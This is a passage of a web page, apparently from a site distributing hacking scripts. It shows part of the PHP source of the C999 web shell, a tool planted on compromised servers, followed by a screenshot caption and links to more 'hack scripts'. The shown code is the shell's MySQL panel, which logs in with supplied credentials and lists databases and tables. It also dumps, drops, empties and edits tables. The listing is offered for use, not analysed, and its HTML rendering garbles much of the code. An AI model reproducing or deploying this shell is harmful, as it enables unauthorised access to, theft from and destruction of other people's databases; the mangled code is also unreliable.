<span class="lineno">1035</span> <span class="x"> $sqlquicklaunch[] = array(&quot;Processes&quot;,$surl.&quot;act=sql&amp;sql_login=&quot;.htmlspecialchars($sql_login).&quot;&amp;sql_passwd=&quot;.htmlspecialchars($sql_passwd).&quot;&amp;sql_server=&quot;.htmlspecialchars($sql_server).&quot;&amp;sql_port=&quot;.htmlspecialchars($sql_port).&quot;&amp;sql_act=processes&quot;);</span>
<span class="lineno">1036</span> <span class="x"> $sqlquicklaunch[] = array(&quot;Logout&quot;,$surl.&quot;act=sql&quot;);</span>
<span class="lineno">1037</span> <span class="x"> echo &quot;&lt;center&gt;&lt;b&gt;MySQL &quot;.mysql_get_server_info().&quot; (proto v.&quot;.mysql_get_proto_info ().&quot;) running in &quot;.htmlspecialchars($sql_server).&quot;:&quot;.htmlspecialchars($sql_port).&quot; as &quot;.htmlspecialchars($sql_login).&quot;@&quot;.htmlspecialchars($sql_server).&quot; (password - \&quot;&quot;.htmlspecialchars($sql_passwd).&quot;\&quot;)&lt;/b&gt;</span>
<span class="lineno">1038</span> <span class="x">&quot;;</span>
<span class="lineno">1039</span> <span class="x"> if (count($sqlquicklaunch) &gt; 0) {foreach($sqlquicklaunch as $item) {echo &quot;[ &lt;a href=&quot;\&amp;quot;&amp;quot;.$item[1].&amp;quot;\&amp;quot;&quot;&gt;&lt;b&gt;&quot;.$item[0].&quot;&lt;/b&gt;&lt;/a&gt; ] &quot;;}}</span>
<span class="lineno">1040</span> <span class="x"> echo &quot;&lt;/center&gt;&quot;;</span>
<span class="lineno">1041</span> <span class="x"> }</span>
<span class="lineno">1042</span> <span class="x"> echo &quot;&lt;/center&gt;&lt;/td&gt;</span>
<span class="lineno">1043</span> <span class="x">&lt;/tr&gt;</span>
<span class="lineno">1044</span> <span class="x">&lt;tr&gt;</span>
<span class="lineno">1045</span> <span class="x">&lt;td valign=&quot;top&quot; width=&quot;28%&quot; height=&quot;100&quot;&gt;&lt;center&gt;&lt;span style=&quot;font-size: x-large;&quot;&gt; i &lt;/span&gt;&lt;/center&gt;</span>
<span class="lineno">1046</span> <span class="x">&lt;ul&gt;</span>
<span class="lineno">1047</span> <span class="x">   &lt;li&gt;If login is null, login is owner of process.&lt;/li&gt;</span>
<span class="lineno">1048</span> <span class="x">   &lt;li&gt;If host is null, host is localhost&lt;/li&gt;</span>
<span class="lineno">1049</span> <span class="x">   &lt;li&gt;If port is null, port is 3306 (default)&lt;/li&gt;</span>
<span class="lineno">1050</span> <span class="x">&lt;/ul&gt;</span>
<span class="lineno">1051</span> <span class="x">&lt;/td&gt;</span>
<span class="lineno">1052</span> <span class="x">&lt;td valign=&quot;top&quot; width=&quot;90%&quot; height=&quot;1&quot;&gt;</span>
<span class="lineno">1053</span> <span class="x">&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;</span>
<span class="lineno">1054</span> <span class="x">&lt;tbody&gt;</span>
<span class="lineno">1055</span> <span class="x">&lt;tr&gt;</span>
<span class="lineno">1056</span> <span class="x">&lt;td&gt;&lt;b&gt;Please, fill the form:&lt;/b&gt;</span>
<span class="lineno">1057</span> <span class="x">&lt;table&gt;</span>
<span class="lineno">1058</span> <span class="x">&lt;tbody&gt;</span>
<span class="lineno">1059</span> <span class="x">&lt;tr&gt;</span>
<span class="lineno">1060</span> <span class="x">&lt;td&gt;&lt;b&gt;Username&lt;/b&gt;&lt;/td&gt;</span>
<span class="lineno">1061</span> <span class="x">&lt;td&gt;&lt;b&gt;Password&lt;/b&gt;&lt;/td&gt;</span>
<span class="lineno">1062</span> <span class="x">&lt;td&gt;&lt;b&gt;Database&lt;/b&gt;&lt;/td&gt;</span>
<span class="lineno">1063</span> <span class="x">&lt;/tr&gt;</span>
<span class="lineno">1064</span> <span class="x">&lt;tr&gt;</span>
<span class="lineno">1065</span> <span class="x">&lt;td&gt;&lt;input type=&quot;text&quot; maxlength=&quot;64&quot; name=&quot;sql_login&quot; value=&quot;root&quot; /&gt;&lt;/td&gt;</span>
<span class="lineno">1066</span> <span class="x">&lt;td&gt;&lt;input type=&quot;password&quot; maxlength=&quot;64&quot; name=&quot;sql_passwd&quot; value=&quot;&quot; /&gt;&lt;/td&gt;</span>
<span class="lineno">1067</span> <span class="x">&lt;td&gt;&lt;input type=&quot;text&quot; maxlength=&quot;64&quot; name=&quot;sql_db&quot; value=&quot;&quot; /&gt;&lt;/td&gt;</span>
<span class="lineno">1068</span> <span class="x">&lt;td&gt;&lt;b&gt;Host&lt;/b&gt;&lt;/td&gt;</span>
<span class="lineno">1069</span> <span class="x">&lt;td&gt;&lt;b&gt;PORT&lt;/b&gt;&lt;/td&gt;</span>
<span class="lineno">1070</span> <span class="x">&lt;td align=&quot;right&quot;&gt;&lt;input type=&quot;text&quot; maxlength=&quot;64&quot; name=&quot;sql_server&quot; value=&quot;localhost&quot; /&gt;&lt;/td&gt;</span>
<span class="lineno">1071</span> <span class="x">&lt;td&gt;&lt;input type=&quot;text&quot; maxlength=&quot;6&quot; name=&quot;sql_port&quot; size=&quot;3&quot; value=&quot;3306&quot; /&gt;&lt;/td&gt;</span>
<span class="lineno">1072</span> <span class="x">&lt;td&gt;&lt;input type=&quot;submit&quot; value=&quot;Connect&quot; /&gt;&lt;/td&gt;</span>
<span class="lineno">1073</span> <span class="x">&lt;td&gt;&lt;/td&gt;</span>
<span class="lineno">1074</span> <span class="x">&lt;/tr&gt;</span>
<span class="lineno">1075</span> <span class="x">&lt;/tbody&gt;</span>
<span class="lineno">1076</span> <span class="x">&lt;/table&gt;</span>
<span class="lineno">1077</span> <span class="x">&lt;/td&gt;</span>
<span class="lineno">1078</span> <span class="x">&lt;!--?php }  else  {   //Start left panel   if (!empty($sql_db))   {    ?--&gt;</span>
<span class="lineno">1079</span> <span class="x">&lt;td valign=&quot;top&quot; width=&quot;25%&quot; height=&quot;100%&quot;&gt;&lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;&gt;&quot;</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Home</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
<span class="lineno">1080</span> 
<span class="lineno">1081</span> <span class="o">&lt;</span><span class="nx">hr</span> <span class="nx">noshade</span><span class="o">=</span><span class="s2">&quot;noshade&quot;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&quot;1&quot;</span> <span class="o">/&gt;</span>
<span class="lineno">1082</span> 
<span class="lineno">1083</span> <span class="o">&lt;!--?</span><span class="nx">php</span> <span class="o">&lt;</span><span class="nx">br</span> <span class="o">?--&gt;</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_list_tables</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">);</span>
<span class="lineno">1084</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
<span class="lineno">1085</span>  <span class="k">else</span>
<span class="lineno">1086</span>  <span class="p">{</span>
<span class="lineno">1087</span>  <span class="k">echo</span> <span class="s2">&quot;---[ &lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt; ]---</span>
<span class="lineno">1088</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1089</span>  <span class="nv">$c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1090</span>  <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$count</span> <span class="o">=</span> <span class="nb">mysql_query</span> <span class="p">(</span><span class="s2">&quot;SELECT COUNT(*) FROM &quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="nv">$count_row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;&lt;a href=&quot;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">sql_db</span><span class="o">=&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_db</span><span class="p">)</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">sql_tbl</span><span class="o">=&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="nx">\</span><span class="o">&amp;</span><span class="nx">quot</span><span class="p">;</span><span class="s2">&quot;&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/a&gt; (&quot;</span><span class="o">.</span><span class="nv">$count_row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)&lt;/b&gt;&quot;</span><span class="p">;</span> <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span> <span class="nv">$c</span><span class="o">++</span><span class="p">;}</span>
<span class="lineno">1091</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$c</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;No tables found in database.&quot;</span><span class="p">;}</span>
<span class="lineno">1092</span>  <span class="p">}</span>
<span class="lineno">1093</span>  <span class="p">}</span>
<span class="lineno">1094</span>  <span class="k">else</span>
<span class="lineno">1095</span>  <span class="p">{</span>
<span class="lineno">1096</span>  <span class="cp">?&gt;</span><span class="x">&lt;/td&gt;</span>
<span class="lineno">1097</span> <span class="x">&lt;td valign=&quot;top&quot; width=&quot;1&quot; height=&quot;100&quot;&gt;&lt;a href=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$sql_surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;</span>
<span class="lineno">1098</span> 
<span class="lineno">1099</span> <span class="x">&lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot; /&gt;</span>
<span class="lineno">1100</span> 
<span class="lineno">1101</span> <span class="x">&lt;!--?php    $result = mysql_list_dbs($sql_sock);    if (!$result) {echo mysql_smarterror();}    else    {     ?--&gt;</span>
<span class="lineno">1102</span> <span class="x">&lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;&lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; /&gt;</span>
<span class="lineno">1103</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;&lt;!--?php &lt;br ?--&gt; $c = 0;&lt;/select&gt;</span>
<span class="lineno">1104</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;$dbs = &quot;&quot;;&lt;/select&gt;</span>
<span class="lineno">1105</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;while ($row = mysql_fetch_row($result)) {$dbs .= &quot;&lt;/select&gt;</span>
<span class="lineno">1106</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;&lt;option selected=&quot;selected&quot; value=&quot;\&amp;quot;&amp;quot;.$row[0].&amp;quot;\&amp;quot;&amp;quot;;&quot;&gt;&quot;.$row[0].&quot;&lt;/option&gt;&lt;/select&gt;</span>
<span class="lineno">1107</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;&quot;; $c++;}&lt;/select&gt;</span>
<span class="lineno">1108</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;echo &quot;&lt;/select&gt;</span>
<span class="lineno">1109</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;&lt;option value=&quot;\&amp;quot;\&amp;quot;&quot;&gt;Databases (&quot;.$c.&quot;)&lt;/option&gt;&lt;/select&gt;</span>
<span class="lineno">1110</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;&quot;;&lt;/select&gt;</span>
<span class="lineno">1111</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;echo $dbs;&lt;/select&gt;</span>
<span class="lineno">1112</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;}&lt;/select&gt;</span>
<span class="lineno">1113</span> <span class="x">&lt;select name=&quot;sql_db&quot;&gt;?&gt;&lt;/select&gt;</span>
<span class="lineno">1114</span> 
<span class="lineno">1115</span> <span class="x">&lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot; /&gt;</span>
<span class="lineno">1116</span> 
<span class="lineno">1117</span> <span class="x">Please, select database</span>
<span class="lineno">1118</span> 
<span class="lineno">1119</span> <span class="x">&lt;hr noshade=&quot;noshade&quot; size=&quot;1&quot; /&gt;</span>
<span class="lineno">1120</span> 
<span class="lineno">1121</span> <span class="x">&lt;input type=&quot;submit&quot; value=&quot;Go&quot; /&gt;&lt;/form&gt;</span>
<span class="lineno">1122</span> <span class="x">&lt;!--?php &lt;br ?--&gt; }</span>
<span class="lineno">1123</span> <span class="x"> //End left panel</span>
<span class="lineno">1124</span> <span class="x"> echo &quot;&lt;/td&gt;</span>
<span class="lineno">1125</span> <span class="x">&lt;td valign=&quot;\&amp;quot;top\&amp;quot;&quot; width=&quot;\&amp;quot;100%\&amp;quot;&quot; height=&quot;\&amp;quot;1\&amp;quot;&quot;&gt;&quot;;</span>
<span class="lineno">1126</span> <span class="x"> //Start center panel</span>
<span class="lineno">1127</span> <span class="x"> $diplay = TRUE;</span>
<span class="lineno">1128</span> <span class="x"> if ($sql_db)</span>
<span class="lineno">1129</span> <span class="x"> {</span>
<span class="lineno">1130</span> <span class="x"> if (!is_numeric($c)) {$c = 0;}</span>
<span class="lineno">1131</span> <span class="x"> if ($c == 0) {$c = &quot;no&quot;;}</span>
<span class="lineno">1132</span> <span class="x"> echo &quot;</span>
<span class="lineno">1133</span> 
<span class="lineno">1134</span> <span class="x">&lt;hr noshade=&quot;noshade&quot; size=&quot;\&amp;quot;1\&amp;quot;&quot; /&gt;</span>
<span class="lineno">1135</span> 
<span class="lineno">1136</span> <span class="x">&lt;center&gt;&lt;b&gt;There are &quot;.$c.&quot; table(s) in this DB (&quot;.htmlspecialchars($sql_db).&quot;).</span>
<span class="lineno">1137</span> <span class="x">&quot;;</span>
<span class="lineno">1138</span> <span class="x"> if (count($dbquicklaunch) &gt; 0) {foreach($dbsqlquicklaunch as $item) {echo &quot;[ &lt;a href=&quot;\&amp;quot;&amp;quot;.$item[1].&amp;quot;\&amp;quot;&quot;&gt;&quot;.$item[0].&quot;&lt;/a&gt; ] &quot;;}}</span>
<span class="lineno">1139</span> <span class="x"> echo &quot;&lt;/b&gt;&lt;/center&gt;&quot;;</span>
<span class="lineno">1140</span> <span class="x"> $acts = array(&quot;&quot;,&quot;dump&quot;);</span>
<span class="lineno">1141</span> <span class="x"> if ($sql_act == &quot;tbldrop&quot;) {$sql_query = &quot;DROP TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="lineno">1142</span> <span class="x"> elseif ($sql_act == &quot;tblempty&quot;) {$sql_query = &quot;&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;DELETE FROM `&quot;.$v.&quot;` \n&quot;;} $sql_act = &quot;query&quot;;}</span>
<span class="lineno">1143</span> <span class="x"> elseif ($sql_act == &quot;tbldump&quot;) {if (count($boxtbl) &gt; 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = &quot;dump&quot;;}</span>
<span class="lineno">1144</span> <span class="x"> elseif ($sql_act == &quot;tblcheck&quot;) {$sql_query = &quot;CHECK TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="lineno">1145</span> <span class="x"> elseif ($sql_act == &quot;tbloptimize&quot;) {$sql_query = &quot;OPTIMIZE TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="lineno">1146</span> <span class="x"> elseif ($sql_act == &quot;tblrepair&quot;) {$sql_query = &quot;REPAIR TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="lineno">1147</span> <span class="x"> elseif ($sql_act == &quot;tblanalyze&quot;) {$sql_query = &quot;ANALYZE TABLE&quot;; foreach($boxtbl as $v) {$sql_query .= &quot;\n`&quot;.$v.&quot;` ,&quot;;} $sql_query = substr($sql_query,0,-1).&quot;;&quot;; $sql_act = &quot;query&quot;;}</span>
<span class="lineno">1148</span> <span class="x"> elseif ($sql_act == &quot;deleterow&quot;) {$sql_query = &quot;&quot;; if (!empty($boxrow_all)) {$sql_query = &quot;DELETE * FROM `&quot;.$sql_tbl.&quot;`;&quot;;} else {foreach($boxrow as $v) {$sql_query .= &quot;DELETE * FROM `&quot;.$sql_tbl.&quot;` WHERE&quot;.$v.&quot; LIMIT 1;\n&quot;;} $sql_query = substr($sql_query,0,-1);} $sql_act = &quot;query&quot;;}</span>
<span class="lineno">1149</span> <span class="x"> elseif ($sql_tbl_act == &quot;insert&quot;)</span>
<span class="lineno">1150</span> <span class="x"> {</span>
<span class="lineno">1151</span> <span class="x"> if ($sql_tbl_insert_radio == 1)</span>
<span class="lineno">1152</span> <span class="x"> {</span>
<span class="lineno">1153</span> <span class="x"> $keys = &quot;&quot;;</span>
<span class="lineno">1154</span> <span class="x"> $akeys = array_keys($sql_tbl_insert);</span>
<span class="lineno">1155</span> <span class="x"> foreach ($akeys as $v) {$keys .= &quot;`&quot;.addslashes($v).&quot;`, &quot;;}</span>
<span class="lineno">1156</span> <span class="x"> if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}</span>
<span class="lineno">1157</span> <span class="x"> $values = &quot;&quot;;</span>
<span class="lineno">1158</span> <span class="x"> $i = 0;</span>
<span class="lineno">1159</span> <span class="x"> foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct.&quot; (&quot;;} $values .= &quot;&#39;&quot;.addslashes($v).&quot;&#39;&quot;; if ($funct) {$values .= &quot;)&quot;;} $values .= &quot;, &quot;; $i++;}</span>
<span class="lineno">1160</span> <span class="x"> if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}</span>
<span class="lineno">1161</span> <span class="x"> $sql_query = &quot;INSERT INTO `&quot;.$sql_tbl.&quot;` ( &quot;.$keys.&quot; ) VALUES ( &quot;.$values.&quot; );&quot;;</span>
<span class="lineno">1162</span> <span class="x"> $sql_act = &quot;query&quot;;</span>
<span class="lineno">1163</span> <span class="x"> $sql_tbl_act = &quot;browse&quot;;</span>
<span class="lineno">1164</span> <span class="x"> }</span>
<span class="lineno">1165</span> <span class="x"> elseif ($sql_tbl_insert_radio == 2)</span>
<span class="lineno">1166</span> <span class="x"> {</span>
<span class="lineno">1167</span> <span class="x"> $set = mysql_buildwhere($sql_tbl_insert,&quot;, &quot;,$sql_tbl_insert_functs);</span>
<span class="lineno">1168</span> <span class="x"> $sql_query = &quot;UPDATE `&quot;.$sql_tbl.&quot;` SET &quot;.$set.&quot; WHERE &quot;.$sql_tbl_insert_q.&quot; LIMIT 1;&quot;;</span>
<span class="lineno">1169</span> <span class="x"> $result = mysql_query($sql_query)</span>
<span class="lineno">1170</span> <span class="x">?&gt;</span></code></pre></div>

<h3>C999 shell Screenshot<figure id="attachment_323" style="width: 604px;" class="wp-caption aligncenter"></h3>

<p><a href="/wp-content/uploads/2014/01/c999.png"><img src="/wp-content/uploads/2014/01/c999-1024x511.png" alt="C999 shell script screenshot" width="604" height="301" class="size-large wp-image-323" /></a><figcaption class="wp-caption-text">C999 shell script screenshot</figcaption></figure></p>



        </section>

        <aside id="sidebar">
          <a href="http://upload.hackingscripts.com" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
